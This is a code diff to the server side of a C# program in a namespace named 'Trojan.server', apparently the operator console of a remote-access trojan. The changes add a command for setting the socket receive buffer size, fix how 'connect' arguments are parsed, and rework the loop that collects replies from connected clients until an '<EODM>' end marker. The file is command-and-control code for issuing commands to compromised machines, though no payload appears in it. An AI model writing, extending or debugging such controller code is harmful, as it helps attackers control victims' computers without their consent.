@@ -1,5 +1,4 @@
 ﻿using System;
-using System.Net;
 using System.Text;
 using System.Net.Sockets;
 using Trojan.exceptions;
@@ -35,6 +34,8 @@ namespace Trojan.server
                         {
                             if (TruncationCheckCommand(CMD, 0, 5) == "local")
                             {
+                                string[] arguments = CMD.Substring(6).Split(" ");
+
                                 if (TruncationCheckCommand(CMD, 6, 3) == "cls" || TruncationCheckCommand(CMD, 6, 5) == "clear")
                                 {
                                     Console.Clear();
@@ -47,10 +48,29 @@ namespace Trojan.server
                                 {
                                     // Display help menu
                                 }
+                                else if(TruncationCheckCommand(CMD, 6, 7) == "pkgsize")
+                                {
+                                    if (2 > arguments.Length) continue;
+
+                                    int new_pkgsize;
+                                    int.TryParse(arguments[1], out new_pkgsize);
+
+                                    if(new_pkgsize > 1024)
+                                    {
+                                        Console.WriteLine("\n[|] package size can not be over 1024 bytes");
+                                    }
+
+                                    if(new_pkgsize < 8)
+                                    {
+                                        Console.WriteLine("\n[|] package size can not be 8 or less bytes");
+                                    }
+
+                                    Listener.sock.ReceiveBufferSize = new_pkgsize;
+                                }
                             }
                             else if (TruncationCheckCommand(CMD, 0, 4) == "conn" || TruncationCheckCommand(CMD, 0, 7) == "connect")
                             {
-                                string[] arguments = CMD.Substring(3).Split(" ");
+                                string[] arguments = CMD.Split(" ");
 
                                 int connectSelection;
                                 int.TryParse(arguments[1], out connectSelection);
@@ -79,10 +99,6 @@ namespace Trojan.server
                                     Console.WriteLine("\n[|] you need to connect to a clint before executing client-side commands");
                                 }
 
-                                string[] arguments = CMD.Substring(3).Split(" ");
-
-                                string SelectedCommand = arguments[1];
-
                                 sendCMD = true;
                             }
                             else if (TruncationCheckCommand(CMD, 0, 7) == "console")
@@ -91,6 +107,8 @@ namespace Trojan.server
                                 {
                                     Console.WriteLine("\n[|] you need to connect to a clint before executing client-side commands");
                                 }
+
+                                // this code is redundant until further implementations of console
 
                                 sendCMD = true;
                             }
@@ -150,33 +168,44 @@ namespace Trojan.server
         public async Task Receive_Socket()
         {
             ConnectionSetup CurrentConnection;
+            bool endofmsg;
             while (ServerStatus == ServerStatus.RUNNING)
             {
                 await Task.Delay(EVENT_CHECK_INTERVAL);
 
                 if (SenderStatus == ServerStatus.WAITRESPONSE)
-                {   
+                {
+                    endofmsg = false;
                     for (int i = 0; i < ConnectionManager.connections.Count(); i++)
                     {
                         CurrentConnection = ConnectionManager.connections[i];
 
-                        if (CurrentConnection.getReceiveTask() == null)
+                        if (CurrentConnection.getConn().Available > 0)
                         {
-                            Task ReceiveTask = Task.Factory.StartNew(() => CurrentConnection.getConn().ReceiveAsync(CurrentConnection.getBuffer(), SocketFlags.None));
-                            CurrentConnection.setReceiveTask(ReceiveTask);
-                        }
-                       
-                        string message = Encoding.UTF8.GetString(CurrentConnection.getBuffer()).Replace("\0", "");
-                        if (CurrentConnection.getBuffer().Length > 0 && message.Length > 0)
-                        {
-                            ConnectionManager.DataQueue.Enqueue(message);
                             Array.Clear(CurrentConnection.getBuffer(), 0, CurrentConnection.getBuffer().Length);
+                            await CurrentConnection.getConn().ReceiveAsync(CurrentConnection.getBuffer(), SocketFlags.None);
+
+                            string message = Encoding.UTF8.GetString(CurrentConnection.getBuffer()).Replace("\0", "");
+
+                            // Check for "end of data message"
+                            if (message.EndsWith("<EODM>"))
+                            {
+                                endofmsg = true;
+                                ReceiverStatus = ServerStatus.IDLE;
+                            }
+                            else { ReceiverStatus = ServerStatus.WAITRESPONSE; }
+
+                            if (endofmsg)
+                                message = message.Replace("<EODM>", "");
+
+                            ConnectionManager.DataQueue.Enqueue(message);
                         }
                     }
 
-                    if (ConnectionManager.DataQueue.Count() > 0)
+                    if (ConnectionManager.DataQueue.Count() > 0 && ReceiverStatus != ServerStatus.WAITRESPONSE)
                     {
-                        ConnectionManager.OutputDataQueue();
+                        ConnectionManager.OutputDataQueue(endchar : false);
+                        SenderStatus = ServerStatus.IDLE;
                     }
                 }
             }
